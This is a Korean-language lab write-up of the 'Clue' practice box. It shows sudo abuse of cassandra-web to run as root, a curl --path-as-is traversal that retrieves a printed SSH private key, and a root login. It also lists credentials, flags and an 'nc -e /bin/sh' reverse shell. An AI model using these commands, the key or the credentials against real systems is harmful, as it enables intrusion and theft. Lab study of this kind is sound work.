**Steps to reproduce the attack:**
1. `sudo -l` → `cassie` 가 `/usr/local/bin/cassandra-web` 을 NOPASSWD·인자 제한 없이 실행 가능함 확인
2. `sudo -u root cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330` 으로 root 권한 인스턴스 기동
3. `curl --path-as-is` 로 동일 경로 순회를 9999 인스턴스에 재실행 → `/home/anthony/.ssh/id_rsa` 획득
4. 키 주석은 `anthony@clue` 이나 실제로는 root 의 `authorized_keys` 에 등록 — 사용자 이름을 전부 시도해 `root` 로 로그인 성공

```bash
sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```
— 출처: `파일보관\Pasted image 20260616171517.png`(터미널 스크린샷)

![[Pasted image 20260616171517.png]]

`(ALL) NOPASSWD:` — 임의 사용자로(`-u root` 포함), 비밀번호 없이. 경로만 고정이고 인자 제한 없음 → 임의 바인드 주소 지정 가능. `secure_path`+`env_reset` 로 PATH 하이재킹·`LD_PRELOAD` 계열은 불가 — 남는 것은 그 바이너리 자체가 무엇을 하는가. `cassandra-web` 은 GTFOBins 에 없음.

```bash
sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330
```

| 인자 | 역할 | 뺐다면 |
|---|---|---|
| `sudo -u root` | root 로 실행 | cassie 권한 인스턴스가 하나 더 생길 뿐, 의미 없음 |
| `-B 0.0.0.0:9999` | 바인드 주소·포트 | 기본 3000 은 이미 점유돼 있어 bind 실패 |
| `-u cassie -p SecondBiteTheApple330` | 백엔드 Cassandra DB 접속 정보 | DB 접속 실패로 기동 실패 가능. `Initial Access` 절에서 채굴한 값 재사용 |

이 명령 자체가 `-p SecondBiteTheApple330` 을 argv 로 넘겨 이 프로세스의 `/proc/<pid>/cmdline` 에도 평문 노출 — Initial Access 의 결함을 스스로 재현.

```bash
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9042          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8021            0.0.0.0:*               LISTEN      544/freeswitch
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:7000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:43711         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:7199          0.0.0.0:*               LISTEN      -
udp        0      0 192.168.239.240:123     0.0.0.0:*                           -
udp        0      0 127.0.0.1:123           0.0.0.0:*                           -
udp        0      0 0.0.0.0:123             0.0.0.0:*                           -
```
— 출처: 원본 writeup 기록 보존

내부에서 본 포트가 nmap 외부 스캔(6개)보다 넓음(12개) — `127.0.0.1:9042`(Cassandra CQL)·`127.0.0.1:7000`(Cassandra 노드간 storage)·`127.0.0.1:7199`(Cassandra JMX, 흔한 RCE 경로)·`127.0.0.1:43711`([가정] JMX/RMI 임의 포트)은 루프백 바인드라 밖에서 안 보였고, `0.0.0.0:1337` 은 외부 바인드인데도 nmap 에 없음 — `Service Enumeration` 절의 `filtered` 판정과 일치, 방화벽 필터링의 실물 증거.

7000·9042·7199 의 정체는 SMB 로 약탈한 Cassandra 설정본으로 확정됨 — `cassandra.yaml` 의 `storage_port: 7000` · `native_transport_port: 9042`, `cassandra-env.sh` 의 `JMX_PORT="7199"` + `LOCAL_JMX=yes`(루프백 전용 바인드의 근거). 출처: `~/PG/Clue/cassandra/etc/cassandra/`.

```bash
curl 0.0.0.0:9999
<!DOCTYPE html>
<html lang="en" ng-app="cassandra">
  <head>
    <base href="/">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cassandra Web</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/css/bootstrap.css">
    <link rel="stylesheet" href="/css/bootstrap-theme.css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- CodeMirror -->
    <link rel="stylesheet" href="/css/codemirror.css">
    <link rel="stylesheet" href="/css/codemirror-solarized.css">
    <!-- Prism -->
    <link rel="stylesheet" href="/css/prism.css">
```
— 출처: 원본 writeup 기록 보존. root 권한 Cassandra Web 인스턴스가 9999 에서 응답 확인

`49362.py` 를 다시 쓸 필요 없이 원리(경로 순회)를 그대로 `curl` 로 재현:

```bash
curl --path-as-is http://0.0.0.0:9999/../../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```
— 출처: 원본 writeup 기록 보존. 회수한 키 사본 `~/PG/Clue/id_rsa`(1823바이트) 와 바이트 일치 확인

`curl` 은 기본적으로 요청을 보내기 전에 클라이언트 쪽에서 `../` 를 정규화함(RFC 3986 §5.2.4) — `--path-as-is` 를 빼면 경로 순회가 서버에 도달조차 못함. 실제로 나간 요청 줄로 확인:

```text
$ curl -s -o /dev/null "http://127.0.0.1:18099/../../../../../../../../../home/anthony/.ssh/id_rsa"
REQUEST LINE: GET /home/anthony/.ssh/id_rsa HTTP/1.1

$ curl -s -o /dev/null --path-as-is "http://127.0.0.1:18099/../../../../../../../../../home/anthony/.ssh/id_rsa"
REQUEST LINE: GET /../../../../../../../../../home/anthony/.ssh/id_rsa HTTP/1.1
```
— 출처: Kali 로컬 리스너(18099)로 직접 찍은 요청 라인 — 박스 풀이 당시의 캡처가 아니라 사후 검증임

`../` 아홉 개가 통째로 사라지면 서버는 존재하지 않는 정적 파일을 찾다 index 를 돌려주고 "traversal 이 막혔다"로 오판하게 됨. 브라우저 주소창도 같은 이유로 못 씀 — Burp Repeater 나 `--path-as-is` 를 쓸 것.

**키로 로그인 — 주석을 믿지 않음.**

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ ssh -i ./id_rsa root@192.168.239.240
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:~#
```
— 출처: 원본 writeup 기록 보존 · `파일보관\Pasted image 20260622131520.png`

원본 노트에 남은 한 줄: *"anthony 계정은 안되고 root만 됨..?"*

```text
┌──(kali㉿kali)-[~/PG/Clue]
└─$ ssh-keygen -l -f id_rsa
2048 SHA256:PN6pyaVqalSAe2eLdTcog5/dsxHYnOaaDsqKw/vYRPs anthony@clue (RSA)
```

키 주석이 `anthony@clue` 인데 로그인되는 계정은 root — 모순이 아님. 주석은 키를 만든 사람이 자기 컴퓨터에서 붙인 라벨(`ssh-keygen` 기본값)일 뿐 서버 인증에 쓰이지 않음. 인증을 결정하는 것은 대상 계정의 `authorized_keys` 에 이 키의 공개키가 등록돼 있는가뿐 — 이 박스는 root 의 `authorized_keys` 에 anthony 의 공개키가 등록돼 있었음(관리자가 자기 키를 root 에 넣어 둔 흔한 패턴). 배너(`Last login:`) 뒤로 `root@clue:~#` 프롬프트가 뜨고 그 위에서 `cat`·`ls` 가 연속 실행됨 — 대화형 pty 셸 확보의 증거이자 아래 플래그를 웹셸이 아닌 곳에서 읽었다는 근거(`파일보관\Pasted image 20260622131520.png` 한 화면에 전부 담겨 있음).

### Post-Exploitation

```bash
root@clue:~# cat proof.txt
The proof is in another file
root@clue:~# ls
proof.txt  proof_youtriedharder.txt  smbd.sh
root@clue:~# cat proof_youtriedharder.txt
1a6357e9c8ef5c6611ff47866ad97541
```
— 출처: `파일보관\Pasted image 20260622131520.png`(터미널 스크린샷)

![[Pasted image 20260622131520.png]]

`/root/proof.txt` 는 미끼(`The proof is in another file`) — `ls` 로 옆의 `proof_youtriedharder.txt` 를 찾아야 진짜 값이 나옴. `smbd.sh` 가 `/root` 에 함께 있음 — [가정] 랩 구성용 스크립트로 보이며 내용은 확인하지 않음.

```bash
root@clue:~# ls -al /var/lib/freeswitch
total 32
drwxr-xr-x  6 freeswitch freeswitch 4096 Aug 11  2022 .
drwxr-xr-x 33 root       root       4096 Aug  5  2022 ..
-rw-------  1 freeswitch freeswitch   25 Aug 13  2022 .bash_history
drwxrwx---  2 freeswitch freeswitch 4096 Aug  3  2024 db
drwxr-xr-x  2 freeswitch freeswitch 4096 Aug  5  2022 images
-rw-------  1 freeswitch freeswitch   33 Jun 21 19:56 local.txt
drwxrwx---  2 freeswitch freeswitch 4096 Aug  5  2022 recordings
drwxrwx---  2 freeswitch freeswitch 4096 Aug  5  2022 storage
root@clue:~# cat /var/lib/freeswitch/local.txt
22288e4fbb81033971802e537c05bdc2
```
— 출처: 원본 writeup 기록 보존. `local.txt` 는 모드 600 `freeswitch` 소유라 root 셸에서 읽음

**Proof.txt value:**
`1a6357e9c8ef5c6611ff47866ad97541`
— 위치: `/root/proof_youtriedharder.txt`(`/root/proof.txt` 는 미끼)

두 플래그 모두 대화형 SSH 셸에서 `cat` 으로 읽음(OSCP 웹셸 취득 0점 요건 충족).

**남긴 흔적**
- **띄운 프로세스** — `sudo -u root cassandra-web -B 0.0.0.0:9999` 가 root 권한으로 남음. 명시적으로 종료한 기록 없음. [가정] 리버트로 소멸. 실전이라면 반드시 죽여야 함 — 인증 없는 root 권한 임의 파일 읽기를 외부에 열어 둔 상태
- **리버스셸** — `nc -e /bin/sh` 로 띄운 FreeSWITCH 계정 셸, 그 위의 `su cassie`
- **타겟에 올린 파일 없음** — 모든 도구는 Kali 에서 원격으로 실행
- **약탈한 데이터** — `~/PG/Clue/freeswitch/`(245개 파일, `/etc/freeswitch` 전체) · `~/PG/Clue/cassandra/`(Cassandra 3.11.13 설치본). 타겟 원본은 읽기만, 수정 없음
- **획득 자격증명** — `cassie`/`SecondBiteTheApple330`(SMB·로컬 `su` 가능, SSH 불가) · FreeSWITCH ESL/`StrongClueConEight021`(백업본의 `ClueCon` 은 낡은 값) · `anthony@clue` 주석 RSA 2048 개인키(`SHA256:PN6pyaVqalSAe2eLdTcog5/dsxHYnOaaDsqKw/vYRPs`, 실제로는 root 로그인용, 사본 `~/PG/Clue/id_rsa`)

## 관련

- Cassandra Web 0.5.0 임의 파일 읽기: EDB **49362** https://www.exploit-db.com/exploits/49362 (`Codes: N/A` · `Verified: False`) · 벤더 https://github.com/avalanche123/cassandra-web (v0.6.0에서 수정)
- FreeSWITCH `mod_event_socket` 명령 실행: EDB **47799** — Kali 실제 경로는 `/usr/share/exploitdb/exploits/windows/remote/47799.txt`(`.txt` 확장자)
- `Rack::Protection`(`PathTraversal` 미들웨어 포함): https://github.com/sinatra/sinatra/tree/main/rack-protection
- `curl --path-as-is`: https://curl.se/docs/manpage.html#--path-as-is
- OSCP Exam Guide, "Exam Proofs": https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
- CVE-2021-44142(Samba `vfs_fruit`) — 이 박스에서 시도했으나 막다른 길(공유 이름 불일치·설정 게이트 미확인). 이 박스를 뚫는 데 쓴 것 중 CVE 번호가 붙은 것은 없어 프론트매터에 `manual_cves: true` 만 선언하고 `cves:` 목록은 비움 — 상세 분석과 시행착오는 [[_PLAYBOOK]] 참조
- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_STATUS]] — 전수 진행현황
- [[Flu]] — 자매 노트. 공개 PoC 의 버전·CVE 표기 검증, 파일 읽기 프리미티브는 권한 경계를 못 넘음, 리버스셸 lhost 점검
- [[RubyDome]] — 누적 패턴 "`sudo -l` 이 좁아도 대상의 권한을 확인하라"
- [[plum]] — 누적 패턴 "익스플로잇 전에 버전과 취약 범위를 대조하라"
- [[Squid]] — 누적 패턴 "응답이 성공을 뜻하지 않는다" · 내부에서 본 포트가 외부 nmap보다 넓다
- [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개"
- [[Exfiltrated]] · [[Hawat]] — 훔친 설정 파일에서 자격증명을 캐는 같은 계열
- [[Butch]] — 웹셸로 얻은 플래그는 OSCP 에서 0점. 증거 스크린샷 형식
- [[_PLAYBOOK#A-4-18. sudo NOPASSWD 대상이 GTFOBins 에 없다 — 「이 프로그램이 뭘 하는가」로 사고한다]] — 이 박스의 권한상승 발상
- [[_PLAYBOOK#A-2-33. 원격 명령 실행에는 항상 절대경로 — CWD 는 «대상 프로세스»의 것이다]] · [[_PLAYBOOK#A-1-32. Apache 루트 403 을 「막혔다」로 읽지 않는다]] · [[_PLAYBOOK#A-1-33. Kali `pip install` 이 거부된다 — PEP 668]]
- [[_PLAYBOOK#B-2-19. 루프백에 열린 무인증 JMX 는 그 자체로 권한상승 후보다]] — 버린 경로 7199
